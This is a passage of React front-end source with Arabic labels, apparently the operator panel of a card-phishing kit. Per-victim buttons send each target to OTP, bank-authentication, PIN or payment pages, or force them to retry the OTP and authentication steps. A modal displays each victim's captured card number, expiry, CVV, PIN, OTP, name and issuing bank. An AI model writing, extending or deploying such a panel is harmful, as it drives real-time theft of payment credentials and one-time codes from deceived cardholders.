                              <button onClick={() => handleDirective(o.id, "otp", "رمز OTP")} className="w-full text-right px-3 py-2 text-xs text-[#334155] hover:bg-gray-50 flex justify-between items-center">
                                رمز OTP <span className="text-[10px]">‹</span>
                              </button>
                              <div className="h-px bg-gray-100 my-0.5"></div>
                              <button onClick={() => handleDirective(o.id, "bank-auth", "مصادقة بنكية")} className="w-full text-right px-3 py-2 text-xs text-[#334155] hover:bg-gray-50 bg-slate-50 flex justify-between items-center">
                                مصادقة بنكية <span className="text-[10px]">‹</span>
                              </button>
                              <div className="h-px bg-gray-100 my-0.5"></div>
                              <button onClick={() => handleDirective(o.id, "pin", "الرقم السري")} className="w-full text-right px-3 py-2 text-xs text-[#334155] hover:bg-gray-50 flex justify-between items-center">
                                الرقم السري <span className="text-[10px]">‹</span>
                              </button>
                              <div className="h-px bg-gray-100 my-0.5"></div>
                              <button onClick={() => handleDirective(o.id, "payment", "صفحة الدفع")} className="w-full text-right px-3 py-2 text-xs text-[#334155] hover:bg-gray-50 flex justify-between items-center">
                                صفحة الدفع <span className="text-[10px]">‹</span>
                              </button>
                              <div className="h-px bg-gray-100 my-0.5"></div>
                              <button onClick={() => handleDirective(o.id, "rejected", "رفض")} className="w-full text-right px-3 py-2 text-xs text-red-700 hover:bg-gray-50 flex justify-between items-center">
                                رفض <span className="text-[10px]">‹</span>
                              </button>
                              <div className="h-px bg-gray-100 my-0.5"></div>
                              <button onClick={() => handleDirective(o.id, "otp?retry=1", "رفض OTP — إعادة إدخال الرمز")} className="w-full text-right px-3 py-2 text-xs text-red-700 hover:bg-gray-50 flex justify-between items-center">
                                رفض OTP <span className="text-[10px]">‹</span>
                              </button>
                              <div className="h-px bg-gray-100 my-0.5"></div>
                              <button onClick={() => handleDirective(o.id, "bank-auth?retry=1", "رفض المصادقة — إعادة المحاولة")} className="w-full text-right px-3 py-2 text-xs text-red-700 hover:bg-gray-50 flex justify-between items-center">
                                رفض المصادقة <span className="text-[10px]">‹</span>
                              </button>
                            </div>
                          </div>

                          {orderFolder === "deleted" ? (
                            <button onClick={() => handleDelete(o.id)} title="حذف نهائي" className="h-6 w-6 rounded bg-[#fee2e2] border border-[#fca5a5] text-[#991b1b] flex items-center justify-center hover:bg-red-200">
                              <Trash2 className="h-3 w-3" />
                            </button>
                          ) : (
                            <button onClick={() => setStatus(o.id, "rejected")} title="رفض" className="h-6 w-6 rounded bg-[#fee2e2] border border-[#fca5a5] text-[#991b1b] flex items-center justify-center hover:bg-red-200 text-[10px] font-bold">
                              ✕
                            </button>
                          )}
                        </div>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
            </div>
          )}

        </main>
      </div>

      {/* نافذة تفاصيل البطاقة البنكية */}
      {cardModal && (
        <div
          className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/50 backdrop-blur-sm"
          onClick={() => setCardModal(null)}
        >
          <div
            dir="rtl"
            onClick={(e) => e.stopPropagation()}
            className="w-full max-w-xs bg-white rounded-xl shadow-2xl overflow-hidden animate-in fade-in zoom-in-95 duration-200"
          >
            {/* رأس النافذة */}
            <div className="flex items-center justify-between px-3.5 py-2.5 border-b border-gray-100">
              <h3 className="text-sm font-bold text-[#1e293b]">بيانات البطاقة البنكية</h3>
              <button
                onClick={() => setCardModal(null)}
                className="h-6 w-6 rounded-full flex items-center justify-center text-gray-400 hover:bg-gray-100 hover:text-gray-700 transition-colors"
                aria-label="إغلاق"
              >
                <X className="h-4 w-4" />
              </button>
            </div>

            <div className="p-3.5 space-y-3">
              {/* بطاقة فيزا مرئية */}
              <div className="relative rounded-xl p-3.5 text-white overflow-hidden shadow-md" style={{ background: "linear-gradient(135deg, #1e3a5f 0%, #16243d 100%)" }} dir="ltr">
                <div className="absolute -left-8 -bottom-10 h-32 w-32 rounded-full bg-white/5"></div>
                <div className="absolute right-10 -top-12 h-24 w-24 rounded-full bg-white/5"></div>
                <div className="relative flex items-start justify-between">
                  <span className="text-sm font-bold italic tracking-wider text-white/90">VISA</span>
                  <span className="h-5 w-7 rounded bg-[#3b6fd1]"></span>
                </div>
                <div className="relative mt-4 font-mono text-base tracking-[0.14em] text-white">
                  {cardModal.cardNumber}
                </div>
                <div className="relative mt-4 flex items-end justify-between">
                  <div className="flex items-end gap-4">
                    <div>
                      <div className="text-[8px] text-white/50 mb-0.5">تاريخ الانتهاء</div>
                      <div className="font-mono text-xs">{cardModal.expiry}</div>
                    </div>
                    <div>
                      <div className="text-[8px] text-white/50 mb-0.5">CVV</div>
                      <div className="font-mono text-xs">{cardModal.cvv}</div>
                    </div>
                  </div>
                  <div className="text-right">
                    <div className="text-[8px] text-white/50 mb-0.5">اسم حامل البطاقة</div>
                    <div className="text-xs font-bold truncate max-w-[120px]">{cardModal.name}</div>
                  </div>
                </div>
              </div>

              {/* شبكة التفاصيل */}
              <div className="grid grid-cols-2 gap-2">
                <div className="rounded-lg bg-gray-50 border border-gray-100 p-2 col-span-2">
                  <div className="text-[10px] text-gray-500 mb-0.5">رقم البطاقة</div>
                  <div className="font-mono text-xs text-[#1e293b] break-all" dir="ltr">{cardModal.cardNumber}</div>
                </div>
                <div className="rounded-lg bg-gray-50 border border-gray-100 p-2">
                  <div className="text-[10px] text-gray-500 mb-0.5">تاريخ الانتهاء</div>
                  <div className="font-mono text-xs text-[#1e293b]" dir="ltr">{cardModal.expiry}</div>
                </div>
                <div className="rounded-lg bg-gray-50 border border-gray-100 p-2">
                  <div className="text-[10px] text-gray-500 mb-0.5">CVV</div>
                  <div className="font-mono text-xs text-[#1e293b]" dir="ltr">{cardModal.cvv}</div>
                </div>
                <div className="rounded-lg bg-gray-50 border border-gray-100 p-2">
                  <div className="text-[10px] text-gray-500 mb-0.5">الرقم السري (PIN)</div>
                  <div className="font-mono text-xs text-[#1e293b]" dir="ltr">{cardModal.pin}</div>
                </div>
                <div className="rounded-lg bg-gray-50 border border-gray-100 p-2">
                  <div className="text-[10px] text-gray-500 mb-0.5">رمز OTP</div>
                  <div className="font-mono text-xs text-[#1e293b]" dir="ltr">{cardModal.otp}</div>
                </div>
                <div className="rounded-lg bg-gray-50 border border-gray-100 p-2 col-span-2">
                  <div className="text-[10px] text-gray-500 mb-0.5">البنك المُصدِر</div>
                  <div className="text-xs font-bold text-[#1e293b]">{cardModal.bankName !== "-" ? cardModal.bankName : "غير محدد"}</div>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
